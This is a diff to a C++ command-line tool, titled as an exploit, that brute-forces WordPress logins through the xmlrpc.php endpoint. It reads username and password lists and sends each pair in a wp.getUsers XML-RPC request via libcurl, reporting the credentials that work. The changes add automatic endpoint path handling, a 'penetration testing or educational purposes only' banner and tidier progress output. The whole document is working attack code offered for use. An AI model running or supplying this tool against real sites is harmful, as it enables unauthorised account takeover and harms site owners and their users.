@@ -2,13 +2,20 @@
  * Exploit Title: Brute force wordpress websites with xmlrpc enabled
  * Date: August 6, 2020
  * Vendor Homepage: https://wordpress.org/
- * Author: xblackey
- * Version: 1.1
+ * Author: Xblackey
+ * Version: 1.2.0
+ * License: MIT
  */
 #include <iostream>
 #include <fstream>
 #include <string.h>
 #include <curl/curl.h>
+
+#define PROGRAM "wpxbruteforce"
+#define VERSION "1.2.0"
+#define AUTHOR "Xblackey"
+
+#define XMLRPC_PATH "/xmlrpc.php"
 
 size_t write_to_string(void *ptr, size_t size, size_t count, void *stream)
 {
@@ -18,6 +25,21 @@ size_t write_to_string(void *ptr, size_t size, size_t count, void *stream)
 
 int main(int argc, char **argv)
 {
+    std::cout << PROGRAM << " " << VERSION << " (c) 2022 by " << AUTHOR
+              << " - Disclaimer: For penetration testing or "
+                 "educational purposes only\n\n";
+
+    std::string url_input = argv[1];
+
+    while (url_input.back() == (char)'/')
+    {
+        url_input.pop_back();
+    }
+
+    url_input += XMLRPC_PATH;
+
+    const char *url = url_input.c_str();
+
     const char *usersFilePath = argv[2];
     std::fstream users_file;
     users_file.open(usersFilePath, std::ios::in);
@@ -40,7 +62,10 @@ int main(int argc, char **argv)
         CURLcode res;
 
         std::string post_str;
-        std::string post1 = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>wp.getUsers</methodName><params><param><value>1</value></param><param><value>";
+        std::string post1 = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
+                            "<methodCall><methodName>wp.getUsers</methodName>"
+                            "<params><param><value>1</value></param>"
+                            "<param><value>";
         std::string username;
         std::string post2 = "</value></param><param><value>";
         std::string password;
@@ -50,7 +75,7 @@ int main(int argc, char **argv)
 
         if (curl)
         {
-            curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
+            curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
             unsigned int count = 0;
             bool found = false;
@@ -88,41 +113,49 @@ int main(int argc, char **argv)
 
                         if (res_str != "" && strstr(res_str, check_fail) && strstr(res_str, fail_code))
                         {
-                            std::cout << count << " - Fail: " << username << " - " << password << std::endl;
+                            std::cout << "\r\e[K" << std::flush;
+                            std::cout << "\r" << count << " - Trying: " << username << " - " << password << std::flush;
                         }
                         else if (strstr(res_str, username_c))
                         {
                             std::cout << std::endl
-                                << res_str << std::endl;
-                            std::cout << count << " - SUCCESS: " << username << " - " << password << " <=== FOUND" << std::endl;
+                                      << res_str << std::endl;
+                            std::cout << count << " - FOUND: " << username << " - " << password << std::endl;
                             found = true;
                             break;
                         }
                         else
                         {
                             std::cout << std::endl
-                                << res_str << std::endl;
-                            std::cout << "ERROR" << std::endl;
+                                      << res_str << std::endl;
+                            std::cout << "Result: ERROR" << std::endl;
+                            std::cout << "--" << std::endl;
+                            std::cout << "Hint: Check the inputs again" << std::endl;
+                            found = true;
+                            break;
                         }
                     }
                     else
                     {
                         std::cout << "curl_easy_perform() failed: " << stderr << std::endl;
+                        found = true;
+                        break;
                     }
                 }
             }
 
             if (!found)
             {
-                std::cout << "NOT FOUND" << std::endl;
+                std::cout << "Result: NOT FOUND" << std::endl;
             }
         }
         else
         {
-            std::cout << "ERROR !curl" << std::endl;
+            std::cout << "Result: ERROR !curl" << std::endl;
         }
         curl_easy_cleanup(curl);
     }
+
     users_file.close();
     passwords_file.close();
 
